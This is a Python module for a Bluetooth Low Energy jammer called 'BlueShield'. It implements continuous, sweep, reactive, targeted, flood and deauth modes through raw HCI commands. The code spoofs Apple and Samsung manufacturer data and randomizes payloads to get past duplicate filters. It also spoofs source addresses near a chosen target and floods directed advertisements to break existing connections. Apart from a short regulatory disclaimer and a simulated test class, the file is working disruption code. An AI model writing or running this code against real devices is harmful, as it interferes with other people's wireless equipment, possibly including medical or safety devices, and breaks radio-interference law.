"""
BlueShield Bluetooth Jammer Module (Research Grade)

WARNING: Bluetooth jamming is regulated by the FCC and equivalent agencies worldwide.
This module is intended ONLY for:
  - Authorized penetration testing
  - Academic/security research in controlled environments
  - Defensive security testing with proper authorization

Supports two backends:
  1. Raw HCI sockets (fast, ~1000+ packets/sec) — preferred on Linux/RPi
  2. hcitool subprocess fallback — works everywhere hcitool is available

Requires: Linux with BlueZ, root privileges, compatible BT adapter.
"""

import subprocess
import struct
import time
import threading
from datetime import datetime, timezone
from dataclasses import dataclass, field
from enum import Enum


class JamMode(Enum):
    REACTIVE = "reactive"       # Jam when unknown device detected
    CONTINUOUS = "continuous"    # Continuous jamming on target channels
    TARGETED = "targeted"       # Jam specific device address
    SWEEP = "sweep"             # Sweep across all BLE channels
    FLOOD = "flood"             # Maximum-rate advertising flood
    DEAUTH = "deauth"           # Connection disruption via rapid ADV_DIRECT_IND


@dataclass
class JamSession:
    """Tracks a jamming session."""
    session_id: int
    mode: str
    channel: int
    target: str = ""
    start_time: str = ""
    end_time: str = ""
    packets_sent: int = 0
    is_active: bool = False


class RawHCISocket:
    """Raw HCI socket for fast direct-to-chip communication.

    Bypasses subprocess overhead by talking to the Bluetooth chip
    via the kernel's HCI socket interface. ~100x faster than hcitool.
    """

    def __init__(self, dev_id: int = 0):
        self.dev_id = dev_id
        self.sock = None

    def open(self) -> bool:
        """Open raw HCI socket. Returns True on success."""
        try:
            import socket as _socket
            # AF_BLUETOOTH = 31, BTPROTO_HCI = 1
            self.sock = _socket.socket(31, _socket.SOCK_RAW, 1)
            self.sock.bind((self.dev_id,))
            self.sock.setblocking(False)
            return True
        except (OSError, PermissionError, AttributeError):
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_cmd(self, ogf: int, ocf: int, params: bytes = b'') -> bool:
        """Send an HCI command directly to the Bluetooth chip."""
        if not self.sock:
            return False
        try:
            opcode = (ogf << 10) | ocf
            # HCI command packet: type (0x01) + opcode (2 bytes LE) + param_len (1 byte) + params
            pkt = struct.pack('<BHB', 0x01, opcode, len(params)) + params
            self.sock.send(pkt)
            return True
        except (OSError, BrokenPipeError):
            return False

    def le_set_adv_params(self, channel_map: int = 0x07, interval_min: int = 0x0020,
                          interval_max: int = 0x0020, adv_type: int = 0x03):
        """HCI LE Set Advertising Parameters (OGF=0x08, OCF=0x0006).

        adv_type 0x03 = ADV_NONCONN_IND (non-connectable undirected)
        channel_map: bit 0=ch37, bit 1=ch38, bit 2=ch39
        """
        params = struct.pack('<HH', interval_min, interval_max)
        params += struct.pack('B', adv_type)        # adv type
        params += struct.pack('B', 0x00)             # own addr type (public)
        params += struct.pack('B', 0x00)             # peer addr type
        params += b'\x00' * 6                        # peer address
        params += struct.pack('B', channel_map)      # channel map
        params += struct.pack('B', 0x00)             # filter policy
        return self.send_cmd(0x08, 0x0006, params)

    def le_set_adv_data(self, data: bytes = None):
        """HCI LE Set Advertising Data (OGF=0x08, OCF=0x0008).

        Max 31 bytes of advertising data. Fills with 0xFF for max disruption.
        """
        if data is None:
            data = b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27  # 31 bytes max garbage
        # Pad to 31 bytes
        data = data[:31].ljust(31, b'\x00')
        params = struct.pack('B', len(data)) + data
        return self.send_cmd(0x08, 0x0008, params)

    def le_set_adv_enable(self, enable: bool = True):
        """HCI LE Set Advertise Enable (OGF=0x08, OCF=0x000A)."""
        params = struct.pack('B', 0x01 if enable else 0x00)
        return self.send_cmd(0x08, 0x000A, params)

    def le_set_random_address(self, addr_bytes: bytes):
        """HCI LE Set Random Address (OGF=0x08, OCF=0x0005).
        Useful for targeted jamming (spoofed source address).
        """
        if len(addr_bytes) != 6:
            return False
        return self.send_cmd(0x08, 0x0005, addr_bytes)


class BluetoothJammer:
    """BLE jammer using raw HCI sockets (fast) or hcitool fallback.

    Implements multiple modern jamming strategies:
    - Continuous: Saturate a single advertising channel with noise
    - Sweep: Rapid channel hopping across all 3 advertising channels
    - Reactive: Burst jamming with scan windows (smart duty cycle)
    - Targeted: Focused interference toward a specific device address
    - Flood: Maximum-rate advertising flood with randomized payloads
    - Deauth: Rapid connection request spoofing to disrupt pairings
    """

    BLE_ADV_CHANNELS = [37, 38, 39]
    CHANNEL_MAP = {37: 0x01, 38: 0x02, 39: 0x04, "all": 0x07}

    # Payload patterns — randomized payloads bypass BLE stack duplicate filters
    PAYLOAD_PATTERNS = [
        b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27,           # Max-length noise
        b'\x02\x01\x06\x1A\xFF\xFF\xFF' + b'\xAA' * 24,  # Fake discoverable flag + noise
        b'\x02\x01\x06\x11\x07' + b'\xDE\xAD' * 13,  # Fake 128-bit service UUID
        b'\x1E\xFF\x4C\x00' + b'\xFF' * 27,           # Spoofed Apple manufacturer data
        b'\x1E\xFF\x75\x00' + b'\xFF' * 27,           # Spoofed Samsung manufacturer data
        b'\x02\x0A\x7F' + b'\xFF' * 28,               # Max TX power + noise
    ]

    def __init__(self, config: dict):
        self.config = config
        self.interface = config.get("interface", "hci0")
        self.dev_id = self._parse_dev_id(self.interface)
        self.power = config.get("jam_power", -20)
        self.is_jamming = False
        self.sessions: list[JamSession] = []
        self.session_count = 0
        self._jam_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._raw_socket: RawHCISocket | None = None
        self._use_raw = False

    @staticmethod
    def _parse_dev_id(interface: str) -> int:
        """Extract device ID from interface name (e.g., 'hci0' -> 0)."""
        try:
            return int(interface.replace("hci", ""))
        except (ValueError, AttributeError):
            return 0

    def _try_raw_socket(self) -> bool:
        """Try to open a raw HCI socket. Returns True if successful."""
        sock = RawHCISocket(self.dev_id)
        if sock.open():
            self._raw_socket = sock
            self._use_raw = True
            return True
        return False

    def _hci_cmd(self, cmd: str, timeout: int = 5) -> str:
        """Execute an HCI command via subprocess (fallback)."""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True, text=True, timeout=timeout
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            return ""

    def _set_adv_params(self, channel: int):
        """Set BLE advertising parameters for jamming."""
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
        if self._use_raw and self._raw_socket:
            # Raw socket: fastest interval (0x0020 = 20ms), non-connectable
            self._raw_socket.le_set_adv_params(channel_map=ch_map,
                                                interval_min=0x0020,
                                                interval_max=0x0020)
        else:
            ch_hex = f"{ch_map:02X}"
            self._hci_cmd(
                f"hcitool -i {self.interface} cmd 0x08 0x0006 "
                f"20 00 20 00 03 00 00 00 00 00 00 00 00 {ch_hex} 00"
            )

    def _set_adv_data(self, data: bytes = None):
        """Set advertising data payload."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data)
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0008 {data_str}")

    def _start_adv(self):
        """Enable BLE advertising."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(True)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 01")

    def _stop_adv(self):
        """Disable BLE advertising."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(False)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 00")

    def _get_random_payload(self) -> bytes:
        """Get a randomized payload to bypass duplicate advertisement filters."""
        import random
        base = random.choice(self.PAYLOAD_PATTERNS)
        # Mutate a few bytes for uniqueness (BLE stacks filter exact duplicates)
        payload = bytearray(base)
        for _ in range(4):
            pos = random.randint(4, min(30, len(payload) - 1))
            payload[pos] = random.randint(0, 255)
        return bytes(payload)

    def _jam_loop_continuous(self, channel: int):
        """Continuous jamming on a single channel.

        Uses minimum advertising interval and rotates payloads to prevent
        the target's BLE stack from filtering duplicate advertisements.
        """
        session = self.sessions[-1] if self.sessions else None
        # Set minimum interval (0x0020 = 20ms) — fastest standard HCI allows
        self._set_adv_params(channel)
        self._set_adv_data(self._get_random_payload())
        self._start_adv()

        cycle = 0
        while not self._stop_event.is_set():
            self._stop_adv()
            # Rotate payloads every cycle to bypass duplicate filters
            self._set_adv_data(self._get_random_payload())
            self._start_adv()
            if session:
                session.packets_sent += 1
            cycle += 1
            # Raw socket is ~100x faster, use tighter loop
            time.sleep(0.0003 if self._use_raw else 0.001)

        self._stop_adv()

    def _jam_loop_sweep(self):
        """Sweep across all 3 BLE advertising channels in rapid succession.

        BLE devices listen on all 3 advertising channels (37, 38, 39) in
        sequence. By sweeping rapidly we maximize the chance of colliding
        with the target's advertising event on whichever channel it uses.
        """
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()
                self._set_adv_params(channel)
                self._set_adv_data(self._get_random_payload())
                self._start_adv()
                if session:
                    session.packets_sent += 1
                # Dwell ~1ms per channel for maximum sweep rate
                time.sleep(0.0008 if self._use_raw else 0.002)

        self._stop_adv()

    def _jam_loop_reactive(self, scanner_ref=None):
        """Reactive jamming with duty-cycle scan windows.

        80% jam / 20% quiet — the quiet window lets the scanner see which
        devices are still present, enabling smart target selection.
        """
        session = self.sessions[-1] if self.sessions else None
        JAM_BURST = 0.2     # 200ms jam burst
        QUIET_WINDOW = 0.05  # 50ms quiet for scanning

        while not self._stop_event.is_set():
            # === Jam burst across all channels ===
            burst_end = time.monotonic() + JAM_BURST
            while time.monotonic() < burst_end and not self._stop_event.is_set():
                for channel in self.BLE_ADV_CHANNELS:
                    if self._stop_event.is_set():
                        break
                    self._stop_adv()
                    self._set_adv_params(channel)
                    self._set_adv_data(self._get_random_payload())
                    self._start_adv()
                    if session:
                        session.packets_sent += 1
                    time.sleep(0.0005 if self._use_raw else 0.001)

            # === Quiet window — scanner can work ===
            self._stop_adv()
            time.sleep(QUIET_WINDOW)

        self._stop_adv()

    def _jam_loop_targeted(self, target: str):
        """Targeted jamming toward a specific device address.

        Sends crafted payloads that mimic the target's manufacturer data
        to cause maximum confusion in nearby BLE receivers. Also uses
        random address spoofing when raw HCI is available.
        """
        session = self.sessions[-1] if self.sessions else None
        import random

        # Parse target address for address-proximity payloads
        target_bytes = None
        try:
            parts = target.replace("-", ":").split(":")
            if len(parts) == 6:
                target_bytes = bytes(int(p, 16) for p in parts)
        except (ValueError, IndexError):
            pass

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()

                # Spoof random address near target if possible
                if target_bytes and self._use_raw and self._raw_socket:
                    spoofed = bytearray(target_bytes)
                    spoofed[-1] = (spoofed[-1] + random.randint(1, 5)) & 0xFF
                    spoofed[0] = spoofed[0] | 0xC0  # Set random address bits
                    self._raw_socket.le_set_random_address(bytes(spoofed))

                self._set_adv_params(channel)
                self._set_adv_data(self._get_random_payload())
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.0003 if self._use_raw else 0.001)

        self._stop_adv()

    def _jam_loop_flood(self):
        """Maximum-rate advertising flood.

        Sends advertisements on all 3 channels simultaneously (channel map 0x07)
        at the minimum HCI interval, rotating payloads and random addresses
        every cycle. This is the highest-throughput mode.
        """
        session = self.sessions[-1] if self.sessions else None
        import random

        # All channels at once for maximum coverage
        ch_map = self.CHANNEL_MAP["all"]
        if self._use_raw and self._raw_socket:
            # Set minimum possible advertising interval
            self._raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=0x0020,  # 20ms minimum per BLE spec
                interval_max=0x0020,
                adv_type=0x03,  # Non-connectable
            )
        else:
            self._set_adv_params("all")

        while not self._stop_event.is_set():
            # Rotate random source address to create phantom devices
            if self._use_raw and self._raw_socket:
                rand_addr = bytes([random.randint(0, 255) for _ in range(5)] + [0xC0 | random.randint(0, 0x3F)])
                self._raw_socket.le_set_random_address(rand_addr)

            self._stop_adv()
            self._set_adv_data(self._get_random_payload())
            self._start_adv()
            if session:
                session.packets_sent += 1
            time.sleep(0.0002 if self._use_raw else 0.001)

        self._stop_adv()

    def _jam_loop_deauth(self, target: str = ""):
        """Connection disruption mode.

        Rapidly toggles advertising on/off with ADV_DIRECT_IND type (0x01)
        to flood the target with connection requests, disrupting existing
        BLE connections and preventing new ones from forming.
        """
        session = self.sessions[-1] if self.sessions else None
        import random

        target_bytes = b'\xFF' * 6
        try:
            parts = target.replace("-", ":").split(":")
            if len(parts) == 6:
                target_bytes = bytes(int(p, 16) for p in parts)
        except (ValueError, IndexError):
            pass

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()

                if self._use_raw and self._raw_socket:
                    # ADV_DIRECT_IND (0x01) directed at target — causes connection attempts
                    params = struct.pack('<HH', 0x0020, 0x0020)  # min interval
                    params += struct.pack('B', 0x01)  # ADV_DIRECT_IND
                    params += struct.pack('B', 0x01)  # own addr = random
                    params += struct.pack('B', 0x00)  # peer addr type = public
                    params += target_bytes             # peer address
                    params += struct.pack('B', self.CHANNEL_MAP.get(channel, 0x07))
                    params += struct.pack('B', 0x00)  # filter
                    self._raw_socket.send_cmd(0x08, 0x0006, params)

                    # Rotate spoofed source address each cycle
                    rand_addr = bytes([random.randint(0, 255) for _ in range(5)] + [0xC0 | random.randint(0, 0x3F)])
                    self._raw_socket.le_set_random_address(rand_addr)
                else:
                    self._set_adv_params(channel)

                self._set_adv_data(self._get_random_payload())
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.0003 if self._use_raw else 0.001)

        self._stop_adv()

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        """Start a jamming session."""
        if self.is_jamming:
            return self.sessions[-1]

        if not self.config.get("jam_enabled", False):
            raise RuntimeError("Jamming is disabled in config. Set jam_enabled=True for research use.")

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        # Bring interface up
        self._hci_cmd(f"hciconfig {self.interface} up")

        # Try raw socket first (much faster)
        if not self._try_raw_socket():
            print("[BlueShield Jammer] Raw HCI socket unavailable, using hcitool fallback")
            self._use_raw = False
        else:
            print("[BlueShield Jammer] Using raw HCI socket (fast mode)")

        mode_map = {
            "sweep": (self._jam_loop_sweep, ()),
            "reactive": (self._jam_loop_reactive, ()),
            "targeted": (self._jam_loop_targeted, (target,)),
            "flood": (self._jam_loop_flood, ()),
            "deauth": (self._jam_loop_deauth, (target,)),
        }
        if mode in mode_map:
            fn, args = mode_map[mode]
            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session

    def stop_jam(self) -> JamSession | None:
        """Stop the current jamming session."""
        if not self.is_jamming:
            return None

        self._stop_event.set()
        if self._jam_thread:
            self._jam_thread.join(timeout=5)

        self._stop_adv()

        # Close raw socket
        if self._raw_socket:
            self._raw_socket.close()
            self._raw_socket = None
            self._use_raw = False

        self.is_jamming = False

        if self.sessions:
            session = self.sessions[-1]
            session.is_active = False
            session.end_time = datetime.now(timezone.utc).isoformat()
            return session
        return None

    def get_status(self) -> dict:
        """Get jammer status."""
        active_session = None
        if self.sessions and self.sessions[-1].is_active:
            s = self.sessions[-1]
            active_session = {
                "session_id": s.session_id,
                "mode": s.mode,
                "channel": s.channel,
                "target": s.target,
                "start_time": s.start_time,
                "packets_sent": s.packets_sent,
            }
        return {
            "is_jamming": self.is_jamming,
            "jam_enabled": self.config.get("jam_enabled", False),
            "total_sessions": len(self.sessions),
            "active_session": active_session,
            "backend": "raw_hci" if self._use_raw else "hcitool",
        }


class SimulatedJammer(BluetoothJammer):
    """Simulated jammer for dashboard testing without hardware."""

    def _jam_loop_continuous(self, channel: int):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_sweep(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_reactive(self, scanner_ref=None):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_targeted(self, target: str):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_flood(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 3  # Simulates higher throughput
            time.sleep(0.005)

    def _jam_loop_deauth(self, target: str = ""):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 2
            time.sleep(0.008)

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        if self.is_jamming:
            return self.sessions[-1]

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        mode_map = {
            "sweep": (self._jam_loop_sweep, ()),
            "reactive": (self._jam_loop_reactive, ()),
            "targeted": (self._jam_loop_targeted, (target,)),
            "flood": (self._jam_loop_flood, ()),
            "deauth": (self._jam_loop_deauth, (target,)),
        }
        if mode in mode_map:
            fn, args = mode_map[mode]
            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session
